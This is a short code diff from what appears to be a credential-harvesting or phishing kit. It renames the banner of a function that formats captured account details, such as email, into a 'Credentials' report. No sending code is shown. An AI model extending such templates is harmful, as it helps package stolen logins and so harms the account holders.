@@ -81,7 +81,7 @@ const composeCredentialsMessage = (data) => {
     }) + ' UTC';
 
     return `
-*🔐 BobbyBoxResults - Credentials 🔐*
+*🔐 CsoBoxResults - Credentials 🔐* 
 
 *ACCOUNT DETAILS*
 - 📧 Email: \`${email || 'Not captured'}\`
